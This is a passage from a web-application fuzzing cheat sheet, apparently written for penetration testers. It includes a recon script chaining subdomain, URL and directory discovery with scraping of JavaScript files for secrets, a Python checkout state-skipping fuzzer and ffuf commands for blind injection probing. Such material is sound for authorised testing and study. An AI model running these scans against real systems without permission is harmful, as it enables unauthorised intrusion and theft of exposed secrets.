cat $OUTDIR/subdomains.txt $OUTDIR/subdomains2.txt | sort -u > $OUTDIR/all-subs.txt

# Phase 2: Live host detection
echo "[*] Probing live hosts..."
cat $OUTDIR/all-subs.txt | httpx -silent -o $OUTDIR/live.txt

# Phase 3: URL collection
echo "[*] Collecting URLs..."
gau $TARGET >> $OUTDIR/urls.txt
waybackurls $TARGET >> $OUTDIR/urls.txt
cat $OUTDIR/live.txt | katana -d 3 -o $OUTDIR/crawled.txt
cat $OUTDIR/urls.txt $OUTDIR/crawled.txt | sort -u > $OUTDIR/all-urls.txt

# Phase 4: Discovery fuzzing
echo "[*] Directory fuzzing..."
for domain in $(cat $OUTDIR/live.txt); do
  ffuf -u "$domain/FUZZ" \
    -w ~/wordlists/common.txt \
    -mc 200,301,302,401,403 \
    -o "$OUTDIR/dirs-$domain.json" \
    -t 100
done

# Phase 5: Parameter discovery
echo "[*] Parameter discovery..."
cat $OUTDIR/all-urls.txt | grep -E "(\?|&)" | \
  grep -vE "\.(jpg|png|gif|css|js|ico)$" > $OUTDIR/paramsurls.txt
arjun -i $OUTDIR/paramsurls.txt -t 50 -o $OUTDIR/found-params.json

# Phase 6: JS analysis
echo "[*] Analyzing JavaScript..."
mkdir -p $OUTDIR/js
for url in $(cat $OUTDIR/all-urls.txt | grep '\.js$'); do
  wget -q $url -O "$OUTDIR/js/$(basename $url)"
done
for js in $OUTDIR/js/*.js; do
  python3 LinkFinder.py -i $js -o $OUTDIR/js-endpoints.txt
  python3 SecretFinder.py -i $js -o $OUTDIR/js-secrets.txt
done

echo "[*] Done! Results in $OUTDIR"
```

---

## FUZZING PAYLOAD REFERENCE

### Injection Point Markers

```
Common FUZZ markers:
FUZZ     # ffuf standard
FUZZ1 FUZZ2  # ffuf multi
W FUZZ   # wfuzz
SNIP     # burp sniper
blast    # burp intruder

URL encoding for payloads in query params:
%20=space %00=null %27=single-quote %22=double-quote %3C=< %3E=> %26=& %7C=|
%2B=+ %2F=/ %5B=[ %5D=] %28=( %29=) %7B={ %7D=} %3A=: %3B=;
```

### Fuzzing State Machine

```python
# State transition fuzzer
import requests

session = requests.Session()
base = "https://target.com"

# State sequence (try all paths)
states = [
    ("/checkout/start", {}),
    ("/checkout/shipping", {"address": "123 Main St"}),
    ("/checkout/payment", {"card": "4242424242424242"}),
    ("/checkout/confirm", {"agree": True}),
]

# Direct access to final state
r = session.post(f"{base}/checkout/confirm", json={"agree": True})
print(f"Direct confirm: {r.status_code}")

# State skip
r = session.post(f"{base}/checkout/payment", json={"card": "4242424242424242"})
print(f"Skip to payment: {r.status_code}")

# State re-entry
r = session.post(f"{base}/checkout/start", json={"items": []})
r2 = session.post(f"{base}/checkout/start", json={"items": []})  # try again
print(f"Double start: {r2.status_code}")
```

### Blind Injection Fuzzing

```bash
# Time-based (look for response time differences)
ffuf -u "https://target.com/api/search?q=FUZZ" \
  -w ~/wordlists/time-based-payloads.txt \
  -t 50 \
  -timeout 15 \
  -ac  # auto-calibration

# Error-based (check for errors in response body)
ffuf -u "https://target.com/api/search?q=FUZZ" \
  -w ~/wordlists/error-payloads.txt \
  -mr "error|exception|SQL|ORA|MySQL|PG::" -t 50

# OOB-based (DNS callback)
ffuf -u "https://target.com/api/search?q=FUZZ" \
  -w ~/wordlists/oob-payloads.txt \
  -t 50
```

---

## FUZZING WORKFLOW BEST PRACTICES

### Quick Fuzzing Workflow

```
0. Recon first → understand the target
1. spiders/katan → crawl for URLs
2. gau/wayback → historical URLs
3. ffuf -top100 → quick directory check
4. arjun → parameter discovery on discovered endpoints
5. gf pattern match → prioritize URLS by vuln class
6. ffuf with vuln-class payloads → brute force
7. Manual verification → confirm vulns
```

### Tool Selection Guide

```
Directory Fuzzing:
- ffuf → best all-around, fast, good filtering
- gobuster → stable, mature, reliable
- feroxbuster → auto-recursion, built-in filter
- dirsearch → lots of options, slow but thorough

Parameter Discovery:
- arjun → best for REST API parameters
- ParamSpider → finds params from Wayback
- ffuf → brute-force params in any input point

Content Fuzzing:
- nuclei → template-based, comprehensive
- ffuf → general purpose fast
- gobuster → directory focused

Custom Fuzzing:
- wfuzz → flexible, framework-based
- Burp Intruder → GUI based, best for complex scenarios
- custom scripts → Python/Go for specific needs
```

---

## FINAL FUZZING RULES

1. **Always proxy** — Burp intercept for analysis
2. **Filter aggressively** — reduce false positives early
3. **Start small** — conserve bandwidth and time
4. **Rate limit** — don't get blocked, use -p flag
5. **Analyze response deltas** — size, code, time, content
6. **Chain findings** — combine fuzz with manual testing
7. **Use context** — tailor wordlists to target tech stack
8. **Verify everything** — blasters find interesting, but manual confirms
9. **Document findings** — screenshots, requests, PoC scripts
10. **Iterate** — refine wordlists based on discoveries
